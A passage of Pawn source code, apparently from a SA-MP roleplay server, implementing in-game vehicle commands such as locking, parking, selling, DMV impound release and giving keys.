		SendClientMessage(playerid, COLOR_GREY, "That player is non-VIP and can only have 1 vehicle spawned. The player must store that vehicle in order to create a new one.");
		return 1;
    }
   	if(PlayerInfo[giveplayerid][pVip] == 1 && VehicleSpawned[giveplayerid] > 1)
   	{
		SendClientMessage(playerid, COLOR_GREY, "That player is Bronze VIP and can only have 2 vehicles spawned. The player must store that vehicle in order to create a new one.");
		return 1;
    }
   	if(PlayerInfo[giveplayerid][pVip] == 2 && VehicleSpawned[giveplayerid] > 2)
   	{
		SendClientMessage(playerid, COLOR_GREY, "That player is Silver VIP and can only have 3 vehicles spawned. The player must store a vehicle in order to create a new one.");
		return 1;
    }
   	if(PlayerInfo[giveplayerid][pVip] == 3 && VehicleSpawned[giveplayerid] > 3)
   	{
		SendClientMessage(playerid, COLOR_GREY, "That player is Gold VIP and can only have 4 vehicles spawned. The player must store a vehicle in order to create a new one.");
		return 1;
    }
    if(PlayerInfo[giveplayerid][pVip] < 0 || PlayerInfo[giveplayerid][pVip] > 3)
    {
    	SendClientMessage(playerid, COLOR_GREY, "ERROR: That player has an invalid VIP level.");
		return 1;
    }

    new Float:X,Float:Y,Float:Z;
    GetPlayerPos(giveplayerid,X,Y,Z);
    new Float:Angle;
    GetPlayerFacingAngle(giveplayerid,Angle);
    new car = CreatePlayerVehicle(giveplayerid, playervehicleid, modelid, X, Y, Z, Angle, color1, color2, 0);
    if(car == INVALID_PLAYER_VEHICLE_ID)
	{
        SendClientMessage(playerid, COLOR_GREY, "ERROR: Something went wrong and the car didn't get created.");
    }
    else
	{
        format(string, sizeof(string), " Vehicle successfully created with ID %d.", car);
        SendClientMessage(playerid, COLOR_GRAD1, string);
    }

    format(string, sizeof(string), "%s has created a %s for %s (Color 1: %d | Color 2: %d).", GetPlayerNameEx(playerid), GetVehicleName(car), GetPlayerNameEx(giveplayerid), color1, color2);
    Log("logs/playervehicle.log", string);
    return 1;
}

CMD:destroypvehicle(playerid, params[])
{
	new giveplayerid;
	if(sscanf(params, "u", giveplayerid))
		return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /destroypvehicle [playerid/partofname]");

	if(!IsPlayerConnected(giveplayerid))
		return SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");

    if(PlayerInfo[playerid][pAdmin] < 4)
		return SendClientMessage(playerid, COLOR_GREY, "You're not allowed to use this command.");

    if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
		return SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");

	if(AdminDuty[giveplayerid] == 1)
		return SendClientMessage(playerid,COLOR_WHITE, "You can't use that command on an on-duty admin.");

	new
		szVehString[1024];

	for(new i, iModelID; i < MAX_PLAYERVEHICLES; i++) {
		if((iModelID = PlayerVehicleInfo[giveplayerid][i][pvModelId] - 400) >= 0) {
			if(PlayerVehicleInfo[giveplayerid][i][pvImpounded]) {
				format(szVehString, sizeof(szVehString), "%s\n%s (impounded)", szVehString, VehicleName[iModelID]);
			}
			else if(PlayerVehicleInfo[giveplayerid][i][pvDisabled]) {
				format(szVehString, sizeof(szVehString), "%s\n%s (disabled)", szVehString, VehicleName[iModelID]);
			}
			else if(!PlayerVehicleInfo[giveplayerid][i][pvSpawned]) {
				format(szVehString, sizeof(szVehString), "%s\n%s (stored)", szVehString, VehicleName[iModelID]);
			}
			else format(szVehString, sizeof(szVehString), "%s\n%s (ID %i)", szVehString, VehicleName[iModelID], PlayerVehicleInfo[giveplayerid][i][pvId]);
		}
		else strcat(szVehString, "\nEmpty");
	}
	ShowPlayerDialogEx(playerid, DELETEPLAYERCAR, DIALOG_STYLE_LIST, "Vehicle Delete", szVehString, "Delete", "Cancel");
	SetPVarInt(playerid, "playeraffectedcarTP", giveplayerid);
	return 1;
}

CMD:carhelp(playerid, params[])
{
    SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
    SendClientMessage(playerid, COLOR_WHITE,"*** CAR OWNERSHIP HELP *** - type a command for more infomation.");
    SendClientMessage(playerid, COLOR_GRAD3,"*** CAR OWNERSHIP *** /buylock /pvlock /park /unmodcar /deletecar /sellmycar /trackcar /finddealership");
    SendClientMessage(playerid, COLOR_GRAD3,"*** CAR OWNERSHIP *** /dmvmenu /givekeys /carkeys /trunkput /trunktake /trunkbalance /car /vstorage /findcartuning");
    return 1;
}

CMD:buylock(playerid, params[])
{
    if(IsAt247(playerid))
	{
	    ShowPlayerDialogEx(playerid, DIALOG_CDLOCKBUY, DIALOG_STYLE_LIST, "24/7", "Alarm Lock		$1000\nIndustrial Lock		$5000", "Buy", "Cancel");
		return 1;
	}
	else
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "   You're not in a 24-7!");
	}
	return 1;
}

CMD:lock(playerid, params[]) {
	return cmd_pvlock(playerid, params);
}

CMD:pvlock(playerid, params[])
{
    new Float: x, Float: y, Float: z;
    if(PlayerInfo[playerid][pVehicleKeysFrom] != INVALID_PLAYER_ID)
	{
        new ownerid = PlayerInfo[playerid][pVehicleKeysFrom];
        if(IsPlayerConnected(ownerid))
		{
            new d = PlayerInfo[playerid][pVehicleKeys];
            if(PlayerVehicleInfo[ownerid][d][pvId] != INVALID_PLAYER_VEHICLE_ID) GetVehiclePos(PlayerVehicleInfo[ownerid][d][pvId], x, y, z);
            if(IsPlayerInRangeOfPoint(playerid, 10.0, x, y, z))
			{
                if(PlayerVehicleInfo[ownerid][d][pvLock] > 0)
				{
                    if(PlayerVehicleInfo[ownerid][d][pvLocked] == 0)
					{
                        GameTextForPlayer(playerid,"~r~Vehicle Locked!",5000,6);
                        PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
                        PlayerVehicleInfo[ownerid][d][pvLocked] = 1;
                        LockPlayerVehicle(ownerid, PlayerVehicleInfo[ownerid][d][pvId], PlayerVehicleInfo[ownerid][d][pvLock]);
                        return 1;
                    }
                    else
					{
                        GameTextForPlayer(playerid,"~g~Vehicle Unlocked!",5000,6);
                        PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
                        PlayerVehicleInfo[ownerid][d][pvLocked] = 0;
                        UnLockPlayerVehicle(ownerid, PlayerVehicleInfo[ownerid][d][pvId], PlayerVehicleInfo[ownerid][d][pvLock]);
                        return 1;
                    }
                }
                else
				{
                    SendClientMessage(playerid, COLOR_GREY, " You don't have a lock system installed on this vehicle.");
                    return 1;
                }
            }
        }
    }
    for(new d = 0 ; d < MAX_PLAYERVEHICLES; d++)
    {
        if(PlayerVehicleInfo[playerid][d][pvId] != INVALID_PLAYER_VEHICLE_ID) GetVehiclePos(PlayerVehicleInfo[playerid][d][pvId], x, y, z);
        if(IsPlayerInRangeOfPoint(playerid, 3.0, x, y, z))
		{
            if(PlayerVehicleInfo[playerid][d][pvLock] > 0 && PlayerVehicleInfo[playerid][d][pvLocked] == 0)
			{
                GameTextForPlayer(playerid,"~r~Vehicle Locked!",5000,6);
                PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
                PlayerVehicleInfo[playerid][d][pvLocked] = 1;
                LockPlayerVehicle(playerid, PlayerVehicleInfo[playerid][d][pvId], PlayerVehicleInfo[playerid][d][pvLock]);
                return 1;
            }
            else if(PlayerVehicleInfo[playerid][d][pvLock] > 0 && PlayerVehicleInfo[playerid][d][pvLocked] == 1)
			{
                GameTextForPlayer(playerid,"~g~Vehicle Unlocked!",5000,6);
                PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
                PlayerVehicleInfo[playerid][d][pvLocked] = 0;
                UnLockPlayerVehicle(playerid, PlayerVehicleInfo[playerid][d][pvId], PlayerVehicleInfo[playerid][d][pvLock]);
                return 1;

            }
            SendClientMessage(playerid, COLOR_GREY, " You don't have a lock system installed on this vehicle.");
            return 1;
        }
    }
    SendClientMessage(playerid, COLOR_GREY, "You're not near any vehicle that you own.");
    return 1;
}

CMD:park(playerid, params[])
{
	if(PlayerInfo[playerid][pVehicleKeysFrom] != INVALID_PLAYER_ID)
	{
		new ownerid = PlayerInfo[playerid][pVehicleKeysFrom];
		if(IsPlayerConnected(ownerid))
		{
			new d = PlayerInfo[playerid][pVehicleKeys];
			if(IsPlayerInVehicle(playerid, PlayerVehicleInfo[ownerid][d][pvId]))
			{
			    if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_GREY, "You must be in the driver seat.");
				new Float:x, Float:y, Float:z, Float:angle, Float:health;
				GetVehicleHealth(PlayerVehicleInfo[ownerid][d][pvId], health);
				if(health < 800) return SendClientMessage(playerid, COLOR_GREY, " Your vehicle is too damaged to park it.");
				if(PlayerInfo[playerid][pLockCar] == GetPlayerVehicleID(playerid)) PlayerInfo[playerid][pLockCar] = INVALID_VEHICLE_ID;
				if(IsARC(GetPlayerVehicleID(playerid))) // RC Vehicles
				{
					new Float:vehPos[3];
					GetVehiclePos(GetPlayerVehicleID(playerid),vehPos[0], vehPos[1], vehPos[2]);
					SetPlayerPos(playerid,vehPos[0], vehPos[1]+0.5, vehPos[2]+0.5);
				}
				GetVehiclePos(PlayerVehicleInfo[ownerid][d][pvId], x, y, z);
				GetVehicleZAngle(PlayerVehicleInfo[ownerid][d][pvId], angle);
				SurfingCheck(GetPlayerVehicleID(playerid));
				UpdatePlayerVehicleParkPosition(ownerid, d, x, y, z, angle, health);
				PutPlayerInVehicle(playerid, GetPlayerVehicleID(playerid), 0);
			 	SetPlayerArmedWeapon(playerid, 0);

				new string[29 + (MAX_PLAYER_NAME * 2)];
				format(string, sizeof(string), "* %s has parked %s's vehicle.", GetPlayerNameEx(playerid), GetPlayerNameEx(ownerid));
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				return 1;
			}
		}
	}
	for(new d = 0 ; d < MAX_PLAYERVEHICLES; d++)
	{
		if(IsPlayerInVehicle(playerid, PlayerVehicleInfo[playerid][d][pvId]))
		{
			new Float:x, Float:y, Float:z, Float:angle, Float:health;
			GetVehicleHealth(PlayerVehicleInfo[playerid][d][pvId], health);
            if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_GREY, "You must be in the driver seat.");
			if(health < 800) return SendClientMessage(playerid, COLOR_GREY, " Your vehicle is too damaged to park it.");
			if(PlayerInfo[playerid][pLockCar] == GetPlayerVehicleID(playerid)) PlayerInfo[playerid][pLockCar] = INVALID_VEHICLE_ID;
			GetVehiclePos(PlayerVehicleInfo[playerid][d][pvId], x, y, z);
			GetVehicleZAngle(PlayerVehicleInfo[playerid][d][pvId], angle);
			SurfingCheck(GetPlayerVehicleID(playerid));
			UpdatePlayerVehicleParkPosition(playerid, d, x, y, z, angle, health);
			PutPlayerInVehicle(playerid, PlayerVehicleInfo[playerid][d][pvId], 0);
			SetPlayerArmedWeapon(playerid, 0);

			new string[30 + (MAX_PLAYER_NAME * 2)];
			format(string, sizeof(string), "* %s has parked their vehicle.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			return 1;
		}
	}
	SendClientMessage(playerid, COLOR_GREY, "You need to be inside a vehicle that you own.");
	return 1;
}

CMD:unmodcar(playerid, params[])
{
	new modList[512], string[128];
	new count = 0;
	for(new d = 0 ; d < MAX_PLAYERVEHICLES; d++)
	{
		if(IsPlayerInVehicle(playerid, PlayerVehicleInfo[playerid][d][pvId]))
		{
			for(new f = 0 ; f < MAX_MODS; f++)
			{
				if(GetVehicleComponentInSlot(PlayerVehicleInfo[playerid][d][pvId], f) != 0)
				{
					if(f != 9 && f != 7 && f != 8)
					{
						format(modList, sizeof(modList), "%s\n%s - %s", modList, partType(f), partName(GetVehicleComponentInSlot(PlayerVehicleInfo[playerid][d][pvId], f)));
					}
					else
					{
					    format(modList, sizeof(modList), "%s\n%s", modList, partType(f));
					}
     				format(string, sizeof(string), "partList%d", count);
					SetPVarInt(playerid, string, GetVehicleComponentInSlot(PlayerVehicleInfo[playerid][d][pvId], f));
					count++;
				}
			}
			if(count == 0)
			{
			    SendClientMessage(playerid, COLOR_GREY, " This vehicle does not have any modifications.");
			    return 1;
			}
		    format(modList, sizeof(modList), "%s\nAll", modList);
		    format(string, sizeof(string), "partList%d", count);
		    SetPVarInt(playerid, string, 999);
		    count++;
		    SetPVarInt(playerid, "modCount", count);
		    ShowPlayerDialogEx(playerid, UNMODCARMENU, DIALOG_STYLE_LIST, "Unmodification Parts", modList, "Select", "Cancel");
		    return 1;
		}
	}
	SendClientMessage(playerid, COLOR_GREY, " You need to be inside a vehicle that you own.");
 	return 1;
}

CMD:deletecar(playerid, params[])
{
   	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You can't use this command while on-duty as admin.");
		return 1;
	}
	if(GetPVarInt(playerid, "dcConfirm") == 0)
	{
		SetPVarInt(playerid, "dcConfirm", 1);
		SendClientMessage(playerid, COLOR_WHITE, "Use of this command will fully delete the vehicle and no refund will be issued.");
		SendClientMessage(playerid, COLOR_WHITE, "If you're sure you want to delete your vehicle, please re-type the command (/deletecar).");
	}
	else
	{
		DeletePVar(playerid, "dcConfirm");
		for(new d = 0 ; d < MAX_PLAYERVEHICLES; d++)
		{
			if(IsPlayerInVehicle(playerid, PlayerVehicleInfo[playerid][d][pvId])) {
				new
					playervehicleid = GetPlayerVehicle(playerid, PlayerVehicleInfo[playerid][d][pvId]),
					string[128];

				format(string, sizeof(string), "%s has deleted their %s.", GetPlayerNameEx(playerid), GetVehicleName(PlayerVehicleInfo[playerid][d][pvId]));
				Log("logs/playervehicle.log", string);
				DestroyPlayerVehicle(playerid, playervehicleid);
				SendClientMessage(playerid, COLOR_WHITE, "Your vehicle has been deleted.");

				return 1;
			}
		}
		SendClientMessage(playerid, COLOR_GREY, " You need to be inside a vehicle that you own.");
	}

	return 1;
}
/*
CMD:refundcar(playerid, params[])
{
   	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You can't use this command while on-duty as admin.");
		return 1;
	}
	if(GetPVarInt(playerid, "dcConfirm") == 0)
	{
		SetPVarInt(playerid, "dcConfirm", 1);
		SendClientMessage(playerid, COLOR_WHITE, "Use of this command will fully delete and refund you 20 percent of the vehicle's price.");
		SendClientMessage(playerid, COLOR_WHITE, "If you're sure you want to remove your vehicle, please re-type the command (/refundcar).");
	}
	else {
		DeletePVar(playerid, "dcConfirm");

		for(new d = 0 ; d < MAX_PLAYERVEHICLES; d++)
		{
			if(IsPlayerInVehicle(playerid, PlayerVehicleInfo[playerid][d][pvId])) {
			    if(PlayerVehicleInfo[playerid][d][pvPrice] == 0)
			        return SendClientMessage(playerid, COLOR_GREY, "Your player vehicle is not worth anything - an admin gave it to you or the price was $0.");

				PlayerInfo[playerid][pCash] += IntToPercentage(PlayerVehicleInfo[playerid][d][pvPrice], 20);
				format(string, sizeof(string), "%s has refunded their %s for $%d.", GetPlayerNameEx(playerid), GetVehicleName(PlayerVehicleInfo[id][listitem][pvId]), IntToPercentage(PlayerVehicleInfo[playerid][d][pvPrice], 20));
				Log("logs/playervehicle.log", string);

    			new
					playervehicleid = GetPlayerVehicle(playerid, PlayerVehicleInfo[playerid][listitem][pvId]);
				DestroyPlayerVehicle(playerid, playervehicleid);
				SendClientMessage(playerid, COLOR_WHITE, "Your vehicle has been deleted.");
				return 1;
			}
		}
		SendClientMessage(playerid, COLOR_GREY, " You need to be inside a vehicle that you own.");
	}

	return 1;
}*/

CMD:sellmycar(playerid, params[]) {
   	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You can't use this command while on-duty as admin.");
		return 1;
	}
    for(new d = 0 ; d < MAX_PLAYERVEHICLES; d++)
	{
        if(IsPlayerInVehicle(playerid, PlayerVehicleInfo[playerid][d][pvId]))
 		{
            new Float:health;
            GetVehicleHealth(PlayerVehicleInfo[playerid][d][pvId], health);
            if(PlayerInfo[playerid][pLevel] == 1)
			{
                SendClientMessage(playerid, COLOR_GREY, "You have to be level 2 or higher to be able to sell vehicles.");
                return 1;
            }
            if(health < 500) return SendClientMessage(playerid, COLOR_GREY, " Your vehicle is too damaged to sell it.");

            new string[128], giveplayerid, price;
			if(sscanf(params, "ud", giveplayerid, price)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /sellmycar [playerid/partofname] [price]");

            if(price < 1) return SendClientMessage(playerid, COLOR_GREY, "Price must be higher than 0.");
            if(PlayerInfo[giveplayerid][pLevel] == 1)
			{
                SendClientMessage(playerid, COLOR_GREY, "The player has to be Level 2 or higher to be able to sell vehicles to them.");
                return 1;
            }
            if(playerid == giveplayerid)
			{
                SendClientMessage(playerid, COLOR_GREY, "You can't use this command on yourself.");
                return 1;
            }
            if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_GREY, "Player is currently not connected to the server.");
            if(ProxDetectorS(8.0, playerid, giveplayerid))
		 	{
		 	    if((PlayerInfo[giveplayerid][pVip] < 2) && (GetVehicleModel(PlayerVehicleInfo[playerid][d][pvId]) == 610  || GetVehicleModel(PlayerVehicleInfo[playerid][d][pvId]) == 611 || GetVehicleModel(PlayerVehicleInfo[playerid][d][pvId]) == 608 || GetVehicleModel(PlayerVehicleInfo[playerid][d][pvId]) == 607))
				{
				    SendClientMessage(playerid, COLOR_GREY, "You can't sell silver VIP vehicles to non-silver VIP.");
				    return 1;
				}
    			if((PlayerInfo[giveplayerid][pVip] < 3) && (GetVehicleModel(PlayerVehicleInfo[playerid][d][pvId]) == 606 || GetVehicleModel(PlayerVehicleInfo[playerid][d][pvId]) == 594 || GetVehicleModel(PlayerVehicleInfo[playerid][d][pvId]) == 441))
				{
				    SendClientMessage(playerid, COLOR_GREY, "You can't sell Gold VIP vehicles to non-Gold VIP.");
				    return 1;
				}
				if(GetPVarInt(playerid, "SellMyTimer") > 0)
				{
					format(string, sizeof(string), "You must wait %d seconds before offering a sale again.", GetPVarInt(playerid, "SellMyTimer"));
					SendClientMessage(playerid,COLOR_GREY,string);
					return 1;
				}
                VehicleOffer[giveplayerid] = playerid;
                VehicleId[giveplayerid] = d;
                VehiclePrice[giveplayerid] = price;
                format(string, sizeof(string), "* You offered %s to buy this %s for $%d.", GetPlayerNameEx(giveplayerid), GetVehicleName(PlayerVehicleInfo[playerid][d][pvId]), price);
                SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                format(string, sizeof(string), "* %s has offered you their %s for $%d, (type /accept car) to buy.", GetPlayerNameEx(playerid), GetVehicleName(PlayerVehicleInfo[playerid][d][pvId]), price);
                SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);

                SetPVarInt(giveplayerid, "carsaleid", PlayerVehicleInfo[playerid][d][pvRealID]);

                SetPVarInt(playerid, "SellMyTimer", 30); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_SELLMYTIMER);
                return 1;
            }
            else
			{
                SendClientMessage(playerid, COLOR_GREY, "That player is not near you.");
                return 1;
            }
        }
    }
    SendClientMessage(playerid, COLOR_GREY, " You need to be inside a vehicle that you own.");
    return 1;
}

CMD:trackcar(playerid, params[])
{
	new vstring[1024];
	for(new i, iModelID; i < MAX_PLAYERVEHICLES; i++) {
		if((iModelID = PlayerVehicleInfo[playerid][i][pvModelId] - 400) >= 0) {
			if(PlayerVehicleInfo[playerid][i][pvImpounded]) {
				format(vstring, sizeof(vstring), "%s\n%s (impounded)", vstring, VehicleName[iModelID]);
			}
			else if(PlayerVehicleInfo[playerid][i][pvDisabled]) {
				format(vstring, sizeof(vstring), "%s\n%s (disabled)", vstring, VehicleName[iModelID]);
			}
			else if(!PlayerVehicleInfo[playerid][i][pvSpawned]) {
				format(vstring, sizeof(vstring), "%s\n%s (stored)", vstring, VehicleName[iModelID]);
			}
			else format(vstring, sizeof(vstring), "%s\n%s", vstring, VehicleName[iModelID]);
		}
		else strcat(vstring, "\nEmpty");
	}
	ShowPlayerDialogEx(playerid, TRACKCAR, DIALOG_STYLE_LIST, "Vehicle GPS Tracking", vstring, "Track", "Cancel");
	return 1;
}

CMD:radargun(playerid, params[])
{
	if(IsACop(playerid) || PlayerInfo[playerid][pFaction] == 4 && PlayerInfo[playerid][pDivision] == 2 || PlayerInfo[playerid][pFaction] == 4 && PlayerInfo[playerid][pRank] >= 5)
	{
		new string[128];
		if(IsPlayerInAnyVehicle(playerid))
		{
			SendClientMessage(playerid, COLOR_GREY, "You can't do this while you're in a vehicle.");
			return 1;
		}

		if(GetPVarInt(playerid, "PBM") > 0)
		{
			SendClientMessage(playerid, COLOR_WHITE, "You're not able to do this while in a paintball game.");
			return 1;
		}
		if(GetPVarInt(playerid, "EventToken") != 0)
		{
			SendClientMessage(playerid, COLOR_GREY, "You can't use the tazer while you're in an event.");
			return 1;
		}

		if(GetPVarInt(playerid, "Injured") == 1)
		{
			SendClientMessage(playerid, COLOR_GREY, "You can't do this right now.");
			return 1;
		}

		if(PlayerInfo[playerid][pJailed] > 0)
		{
			SendClientMessage(playerid, COLOR_WHITE, "You can't use this in jail/prison.");
			return 1;
		}
		if(PlayerCuffed[playerid] >= 1) {
			SendClientMessage(playerid, COLOR_WHITE, "You can't use this while tazed/cuffed.");
			return 1;
		}

		new SpeedRadar = GetPVarInt(playerid, "SpeedRadar");
		if(SpeedRadar == 0)
		{
			SetPVarInt(playerid, "RadarReplacement", PlayerInfo[playerid][pGuns][9]);
			if(PlayerInfo[playerid][pGuns][9] != 0) RemovePlayerWeapon(playerid, PlayerInfo[playerid][pGuns][9]);
			format(string, sizeof(string), "* %s takes out a LIDAR speed gun.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			GivePlayerValidWeapon(playerid, 43, 60000);
			SetPVarInt(playerid, "SpeedRadar", 1);
		}
		else
		{
			RemovePlayerWeapon(playerid, 43);
			GivePlayerValidWeapon(playerid, GetPVarInt(playerid, "RadarReplacement"), 60000);
			format(string, sizeof(string), "* %s puts away their LIDAR speed gun.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			DeletePVar(playerid, "SpeedRadar");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "   You're not a Cop / FBI / Coastguard!");
		return 1;
	}
	return 1;
}

CMD:dmvrelease(playerid, params[]) {
	switch(PlayerInfo[playerid][pFaction]) {
		case 1, 2: {}
		default: return 1;
	}
    if(IsPlayerInRangeOfPoint(playerid, 3.0, 833.60, 3.23, 1004.17)) {

		new
			iTargetID;

		if(sscanf(params, "u", iTargetID)) {
			SendClientMessage(playerid, COLOR_GREY, "USAGE: /dmvrelease [playerid/partofname]");
		}
		else if(IsPlayerConnected(iTargetID)) {

			new
				vstring[1024],
				iCount;

			for(new i; i < MAX_PLAYERVEHICLES; i++) {
		    	if(PlayerVehicleInfo[iTargetID][i][pvPrice] < 1) PlayerVehicleInfo[iTargetID][i][pvPrice] = 5000;

		    	new iCost = (PlayerVehicleInfo[iTargetID][i][pvPrice] / 10) + PlayerVehicleInfo[iTargetID][i][pvTicket];

		    	if(iCost > 100)
		        	iCost = 100;

				if(PlayerVehicleInfo[iTargetID][i][pvId] > INVALID_PLAYER_VEHICLE_ID) {
					if(PlayerVehicleInfo[iTargetID][i][pvTicket]) {
						format(vstring, sizeof(vstring), "%s\n%s (ticket - $%i)", vstring, VehicleName[PlayerVehicleInfo[iTargetID][i][pvModelId] - 400], PlayerVehicleInfo[iTargetID][i][pvTicket]);
						++iCount;
					}
					else format(vstring, sizeof(vstring), "%s\n%s", vstring, VehicleName[PlayerVehicleInfo[iTargetID][i][pvModelId] - 400]);
				}
				else if(PlayerVehicleInfo[iTargetID][i][pvImpounded]) {
					format(vstring, sizeof(vstring), "%s\n%s (impounded - $%i release)", vstring, VehicleName[PlayerVehicleInfo[iTargetID][i][pvModelId] - 400], iCost);
					++iCount;
				}
				else format(vstring, sizeof(vstring), "%s\nNone", vstring);
			}
			if(iCount) ShowPlayerDialogEx(playerid, MPSPAYTICKETSCOP, DIALOG_STYLE_LIST, "Vehicles", vstring, "Release", "Cancel"), SetPVarInt(playerid, "vRel", iTargetID);
			else SendClientMessage(playerid, COLOR_GRAD2, "This person doesn't have any tickets to be paid or vehicles to be released.");
		}
		else SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");
	}
	else SendClientMessage(playerid, COLOR_GRAD2, "You're not at the DMV release point in Dillimore (inside the DMV).");
	return 1;
}

CMD:dmvmenu(playerid, params[])
{
    if(IsPlayerInRangeOfPoint(playerid, 3.0, 833.60, 3.23, 1004.17))
	{
	    if(PlayerInfo[playerid][pCarLic] == 0)
	    {
	        SendClientMessage(playerid, COLOR_GRAD2, "A valid driver's license is required to release your vehicle from the impound, or pay any tickets.");
	        return 1;
	    }

		new
			vstring[1024],
			iCount;

		for(new i; i < MAX_PLAYERVEHICLES; i++) {
		    if(PlayerVehicleInfo[playerid][i][pvPrice] < 1) PlayerVehicleInfo[playerid][i][pvPrice] = 5000;

		    new iCost = (PlayerVehicleInfo[playerid][i][pvPrice] / 10) + PlayerVehicleInfo[playerid][i][pvTicket] + (PlayerInfo[playerid][pLevel] * 10);

		    if(iCost > 10000)
		    {
		        iCost = 1000;
		    }

			if(PlayerVehicleInfo[playerid][i][pvId] > INVALID_PLAYER_VEHICLE_ID) {
				if(PlayerVehicleInfo[playerid][i][pvTicket]) {
					format(vstring, sizeof(vstring), "%s\n%s (ticket - $%i)", vstring, VehicleName[PlayerVehicleInfo[playerid][i][pvModelId] - 400], PlayerVehicleInfo[playerid][i][pvTicket]);
					++iCount;
				}
				else format(vstring, sizeof(vstring), "%s\n%s", vstring, VehicleName[PlayerVehicleInfo[playerid][i][pvModelId] - 400]);
			}
			else if(PlayerVehicleInfo[playerid][i][pvImpounded]) {
				format(vstring, sizeof(vstring), "%s\n%s (impounded - $%i release)", vstring, VehicleName[PlayerVehicleInfo[playerid][i][pvModelId] - 400], iCost);
				++iCount;
			}
			else format(vstring, sizeof(vstring), "%s\nNone", vstring);
		}
		if(iCount)
		{
			ShowPlayerDialogEx(playerid, MPSPAYTICKETS, DIALOG_STYLE_LIST, "Vehicles", vstring, "Release", "Cancel");
		}
		else SendClientMessage(playerid, COLOR_GRAD2, "You don't have any tickets to be paid or vehicles to be released.");
	}
	else SendClientMessage(playerid, COLOR_GRAD2, "You're not at the DMV release point in Dillimore (inside the DMV).");
	return 1;
}

CMD:givekeys(playerid, params[])
{
	new
		giveplayerid;

    if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /givekeys [playerid/partofname]");
    if(IsPlayerConnected(giveplayerid))
	{
        if(playerid == giveplayerid) return 1;
        if(ProxDetectorS(8.0, playerid, giveplayerid))
		{
            new
				iValidVehicles,
				vstring[512];

			for(new i; i < MAX_PLAYERVEHICLES; i++)
			{
				if(PlayerVehicleInfo[playerid][i][pvId] != INVALID_PLAYER_VEHICLE_ID)
					format(vstring, sizeof(vstring), "%s\n%s", vstring, VehicleName[PlayerVehicleInfo[playerid][i][pvModelId] - 400]), ++iValidVehicles;

				else if(PlayerVehicleInfo[playerid][i][pvImpounded] == 1)
					format(vstring, sizeof(vstring), "%s\n%s (impounded)", vstring, VehicleName[PlayerVehicleInfo[playerid][i][pvModelId] - 400]);

				else if(PlayerVehicleInfo[playerid][i][pvDisabled] == 1 && PlayerVehicleInfo[playerid][i][pvModelId] >= 400)
				format(vstring, sizeof(vstring), "%s\n%s (disabled)", vstring, VehicleName[PlayerVehicleInfo[playerid][i][pvModelId] - 400]);

				else if(PlayerVehicleInfo[playerid][i][pvSpawned] == 0 && PlayerVehicleInfo[playerid][i][pvModelId] >= 400)
				format(vstring, sizeof(vstring), "%s\n%s (stored)", vstring, VehicleName[PlayerVehicleInfo[playerid][i][pvModelId] - 400]);

				else
					format(vstring, sizeof(vstring), "%s\nEmpty", vstring);
			}
            if(iValidVehicles != 0)
			{
                GiveKeysTo[playerid] = giveplayerid;
                ShowPlayerDialogEx(playerid, GIVEKEYS, DIALOG_STYLE_LIST, "Please select a vehicle.", vstring, "Give Keys", "Cancel");
            }
            else
			{
                SendClientMessage(playerid, COLOR_GRAD2, "You don't have any vehicles for which you can give out keys.");
            }
        }
        else
		{
            SendClientMessage(playerid, COLOR_GRAD1, "You're not close enough to that player.");
        }
    }
    return 1;
}

CMD:carkeys(playerid, params[])
{
    new vstring[768], iValidVehicles;
	for(new i = 0; i < MAX_PLAYERVEHICLES; i++) {
	    if(PlayerVehicleInfo[playerid][i][pvId] != INVALID_PLAYER_VEHICLE_ID) {
	        if(PlayerVehicleInfo[playerid][i][pvAllowedPlayerId] != INVALID_PLAYER_ID) {
				format(vstring, sizeof(vstring), "%s\n%s | Keys: %s", vstring, VehicleName[PlayerVehicleInfo[playerid][i][pvModelId] - 400], GetPlayerNameEx(PlayerVehicleInfo[playerid][i][pvAllowedPlayerId]));
				iValidVehicles ++;
			} else if(PlayerVehicleInfo[playerid][i][pvImpounded] == 1 || PlayerVehicleInfo[playerid][i][pvSpawned] == 0) {
				format(vstring, sizeof(vstring), "%s\n%s | Keys: Unavailable", vstring, VehicleName[PlayerVehicleInfo[playerid][i][pvModelId] - 400]);
			} else {
                format(vstring, sizeof(vstring), "%s\n%s | Keys: No-one", vstring, VehicleName[PlayerVehicleInfo[playerid][i][pvModelId] - 400]);
			}
		} else {
